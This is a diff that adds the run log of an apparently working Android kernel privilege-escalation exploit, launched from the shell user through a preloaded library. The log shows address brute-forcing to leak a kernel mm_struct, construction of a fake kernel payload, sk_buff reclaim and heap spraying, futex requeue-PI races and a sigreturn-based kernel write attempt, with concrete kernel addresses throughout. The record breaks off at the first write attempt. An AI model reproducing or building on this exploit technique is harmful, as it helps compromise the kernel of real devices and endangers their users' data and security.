@@ -1,0 +1,189 @@
+===== preload.so crash-safe log =====
+path=/storage/emulated/0/Download/.temp/log_1788946954.txt pid=8241 uid=2000
+1788946954.850 8241 [+] preload starting pid=8241
+1788946954.851 8241 [+] startup context pid=8241 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+1788946954.852 8241 [+] build config pid=8241 label=pd2238_os6_163150_w10 slide=pselect main=pselect
+1788946954.852 8241 [+] p0 profile pid=8241 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
+1788946954.852 8241 [+] direct-map base=ffffff8040000000 slide=0000000000000000
+1788946954.853 8241 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=09949435-6622-488b-967a-02190625b328 (odd attempts: leaked page scratch, even attempts: this alias)
+1788946960.748 8241 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+1788946963.286 8241 [*] pile-up verified: approx_time=1317
+1788946963.287 8241 [*] start finding collisisons
+1788946963.287 8241 [*] target    0000007eb081f0c8
+1788946963.918 8241 [*]   0000006c1a6984c0
+1788946965.430 8241 [*]   0000006c1b0c4620
+1788946967.732 8241 [*]   0000006c1be1f0f8
+1788946968.643 8241 [*]   0000006c1c172b90
+1788946969.836 8241 [*]   0000006c1cc6b358
+1788946971.246 8241 [*]   0000006c1d96bb58
+1788946971.616 8241 [*]   0000006c1dc29148
+1788946972.439 8241 [*]   0000006c1e395ca8
+1788946973.740 8241 [*]   0000006c1ee31188
+1788946974.177 8241 [*]   0000006c1f1e4f20
+1788946974.578 8241 [*]   0000006c1f52a950
+1788946976.136 8241 [*]   0000006c2039fcf8
+1788946976.534 8241 [*]   0000006c20643218
+1788946976.702 8241 [*]   0000006c2067a3d0
+1788946977.243 8241 [*]   0000006c20af87c0
+1788946977.245 8241 [*] found 15 collisisons
+1788946978.043 8241 [*] start bruteforcing
+1788946978.044 8241 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+1788946978.044 8241 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+1788946978.045 8241 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+1788946978.048 8241 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
+1788946978.045 8241 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+1788946978.052 8241 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+1788946978.048 8241 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+1788946978.048 8241 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+1788946978.048 8241 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
+1788946978.050 8241 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
+1788946978.053 8241 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
+1788946978.054 8241 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+1788946978.057 8241 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+1788946978.057 8241 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+1788946978.060 8241 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
+1788946978.061 8241 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+1788946978.063 8241 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
+1788946978.066 8241 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
+1788946978.069 8241 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+1788946978.080 8241 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
+1788946978.083 8241 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
+1788946978.085 8241 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
+1788946978.088 8241 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+1788946978.091 8241 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
+1788946978.094 8241 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
+1788946978.110 8241 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
+1788946978.098 8241 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
+1788946978.100 8241 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+1788946978.103 8241 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+1788946978.105 8241 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+1788946978.108 8241 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
+1788946978.112 8241 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
+1788946978.115 8241 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
+1788946978.127 8241 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
+1788946978.130 8241 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
+1788946978.133 8241 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+1788946978.135 8241 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
+1788946978.150 8241 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
+1788946978.137 8241 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+1788946978.139 8241 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
+1788946978.142 8241 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
+1788946978.145 8241 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
+1788946978.147 8241 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
+1788946978.150 8241 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
+1788946978.170 8241 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
+1788946978.170 8241 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
+1788946978.186 8241 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
+1788946978.172 8241 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
+1788946978.175 8241 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
+1788946978.180 8241 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
+1788946978.184 8241 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
+1788946978.185 8241 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
+1788946978.188 8241 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
+1788946978.194 8241 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
+1788946978.196 8241 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
+1788946978.197 8241 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
+1788946978.199 8241 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
+1788946978.202 8241 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
+1788946978.204 8241 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
+1788946978.207 8241 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
+1788946978.210 8241 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
+1788946978.211 8241 [*] [  1] tested 800000 candidates, scanning=0xffffff882ca48f00
+1788946978.213 8241 [*] [  3] tested 800000 candidates, scanning=0xffffff982ca48f00
+1788946978.220 8241 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
+1788946978.228 8241 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
+1788946978.236 8241 [*] [  2] tested 800000 candidates, scanning=0xffffff902ca48f00
+1788946978.239 8241 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
+1788946978.241 8241 [*] [  5] tested 700000 candidates, scanning=0xffffffa8270fff80
+1788946978.241 8241 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
+1788946978.242 8241 [*] [  1] tested 900000 candidates, scanning=0xffffff88323921c0
+1788946978.248 8241 [*] [  3] tested 900000 candidates, scanning=0xffffff98323921c0
+1788946978.250 8241 [*] [  7] tested 700000 candidates, scanning=0xffffffb8270fff80
+1788946978.253 8241 [*] [  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
+1788946978.255 8241 [*] [  2] tested 900000 candidates, scanning=0xffffff90323921c0
+1788946978.255 8241 [*] [  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
+1788946978.258 8241 [*] [  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
+1788946978.261 8241 [*] [  4] tested 900000 candidates, scanning=0xffffffa0323921c0
+1788946978.261 8241 [*] [  1] tested 1000000 candidates, scanning=0xffffff8837cdb480
+1788946978.265 8241 [*] [  3] tested 1000000 candidates, scanning=0xffffff9837cdb480
+1788946978.269 8241 [*] [  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
+1788946978.272 8241 [*] [  0] tested 1100000 candidates, scanning=0xffffff803d624740
+1788946978.279 8241 [*] [  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
+1788946978.285 8241 [*] [  6] tested 900000 candidates, scanning=0xffffffb0323921c0
+1788946978.288 8241 [*] [  5] tested 900000 candidates, scanning=0xffffffa8323921c0
+1788946978.290 8241 [*] [  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
+1788946978.291 8241 [*] [  1] tested 1100000 candidates, scanning=0xffffff883d624740
+1788946978.329 8241 [*] [  3] tested 1100000 candidates, scanning=0xffffff983d624740
+1788946978.358 8241 [*] [  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
+1788946978.361 8241 [*] [  2] tested 1100000 candidates, scanning=0xffffff903d624740
+1788946978.363 8241 [*] [  7] tested 900000 candidates, scanning=0xffffffb8323921c0
+1788946978.367 8241 [*] [  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
+1788946978.390 8241 [*] [  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
+1788946978.393 8241 [*] [  4] tested 1100000 candidates, scanning=0xffffffa03d624740
+1788946978.395 8241 [*] [  1] tested 1200000 candidates, scanning=0xffffff8842f6da00
+1788946978.400 8241 [*] [  3] tested 1200000 candidates, scanning=0xffffff9842f6da00
+1788946978.400 8241 [*] [  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
+1788946978.402 8241 [*] [  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
+1788946978.406 8241 [*] [  6] tested 1100000 candidates, scanning=0xffffffb03d624740
+1788946978.417 8241 [*] [  2] tested 1300000 candidates, scanning=0xffffff90488b6cc0
+1788946978.407 8241 [*] [  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
+1788946978.409 8241 [*] [  5] tested 1100000 candidates, scanning=0xffffffa83d624740
+1788946978.413 8241 [*] [  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
+1788946978.434 8241 [*] [  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
+1788946978.436 8241 [*] [  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
+1788946978.415 8241 [*] [  1] tested 1300000 candidates, scanning=0xffffff88488b6cc0
+1788946978.417 8241 [*] [  3] tested 1300000 candidates, scanning=0xffffff98488b6cc0
+1788946978.418 8241 [*] [  7] tested 1100000 candidates, scanning=0xffffffb83d624740
+1788946978.422 8241 [*] [  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
+1788946978.424 8241 [*] [  2] tested 1400000 candidates, scanning=0xffffff904e1fff80
+1788946978.428 8241 [*] [  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
+1788946978.440 8241 [*] [  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
+1788946978.443 8241 [*] [  5] tested 1300000 candidates, scanning=0xffffffa8488b6cc0
+1788946978.444 8241 [*] [  3] tested 1400000 candidates, scanning=0xffffff984e1fff80
+1788946978.461 8241 [*] [  5] tested 1400000 candidates, scanning=0xffffffa84e1fff80
+1788946978.451 8241 [*] [  1] tested 1400000 candidates, scanning=0xffffff884e1fff80
+1788946978.452 8241 [*] [  7] tested 1200000 candidates, scanning=0xffffffb842f6da00
+1788946978.453 8241 [*] [  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
+1788946978.456 8241 [*] [  2] tested 1500000 candidates, scanning=0xffffff9053b48f00
+1788946978.458 8241 [*] [  0] tested 1500000 candidates, scanning=0xffffff8053b48f00
+1788946978.460 8241 [*] [  4] tested 1500000 candidates, scanning=0xffffffa053b48f00
+1788946978.464 8241 [*] [  3] tested 1500000 candidates, scanning=0xffffff9853b48f00
+1788946978.464 8241 [*] [  5] tested 1500000 candidates, scanning=0xffffffa853b48f00
+1788946978.466 8241 [*] [  1] tested 1500000 candidates, scanning=0xffffff8853b48f00
+1788946978.468 8241 [*] [  6] tested 1400000 candidates, scanning=0xffffffb04e1fff80
+1788946978.469 8241 [*] [  2] tested 1600000 candidates, scanning=0xffffff90594921c0
+1788946978.475 8241 [*] [  4] tested 1600000 candidates, scanning=0xffffffa0594921c0
+1788946978.475 8241 [*] [  0] tested 1600000 candidates, scanning=0xffffff80594921c0
+1788946978.478 8241 [*] [  3] tested 1600000 candidates, scanning=0xffffff98594921c0
+1788946978.481 8241 [*] [  7] tested 1300000 candidates, scanning=0xffffffb8488b6cc0
+1788946978.482 8241 [*] [  5] tested 1600000 candidates, scanning=0xffffffa8594921c0
+1788946978.485 8241 [*] [  1] tested 1600000 candidates, scanning=0xffffff88594921c0
+1788946978.486 8241 [*] [  6] tested 1500000 candidates, scanning=0xffffffb053b48f00
+1788946978.486 8241 [*] [  4] tested 1700000 candidates, scanning=0xffffffa05eddb480
+1788946978.502 8241 [*] [  6] thread done, tested 1500000 candidates
+1788946978.488 8241 [*] [  2] tested 1700000 candidates, scanning=0xffffff905eddb480
+1788946978.492 8241 [*] [  3] tested 1700000 candidates, scanning=0xffffff985eddb480
+1788946978.503 8241 [*] [  2] thread done, tested 1700000 candidates
+1788946978.494 8241 [*] [  7] tested 1400000 candidates, scanning=0xffffffb84e1fff80
+1788946978.501 8241 [*] [  0] thread done, tested 1681013 candidates
+1788946978.501 8241 [*] [  5] thread done, tested 1600000 candidates
+1788946978.501 8241 [*] [  1] thread done, tested 1600000 candidates
+1788946978.502 8241 [*] [  4] thread done, tested 1700000 candidates
+1788946978.503 8241 [*] [  3] thread done, tested 1700000 candidates
+1788946978.504 8241 [*] [  7] thread done, tested 1400000 candidates
+1788946978.507 8241 [*] prepare_kernel_page leaked_mm=ffffff805dce7bc0 base=ffffff805dce0000 mode=0
+1788946978.507 8241 [*] fake payload mode=0 write_shape=0 lock=ffffff805dce04d0 w0=ffffff805dce13a0 task=ffffff805dce2380 write_parent=ffffff805dce0180 write_right=0000000000000000 write_left=ffffff805dce2180
+1788946978.511 8241 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
+1788946978.511 8241 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
+1788946978.512 8241 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
+1788946978.512 8241 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
+1788946978.515 8241 [*] done
+1788946982.129 8241 [+] heap_spray: page_base=ffffff805dce0000 (leaked mm_struct)
+1788946982.131 8241 [+] ckpt: route enter
+1788946982.132 8241 [+] ckpt: route threads spawned
+1788946982.137 8241 [+] ckpt: route ready waiter_waiting=1 owner_started=1
+1788946982.240 8241 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
+1788946990.136 8241 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=17825 sigalrm=0 setprio=0/0
+1788946990.138 8241 [+] ckpt: do_sigret enter page=ffffff805dce0000 lock=ffffff805dce04d0 fops=ffffff805dce0180
+1788946990.138 8241 [+] ckpt: sigframe ready sf=0x7eaef9edb0 reserved=0x7eaef9f000 align16=1
+1788946990.139 8241 [+] ckpt: sigret attempt=1 page=ffffff805dce0000 lock=ffffff805dce04d0 tree_pc=ffffff805dce0180 tree_left=ffffff805dce2180 task=ffffff8042aec240 (rt_sigreturn then silent prctl+hold)
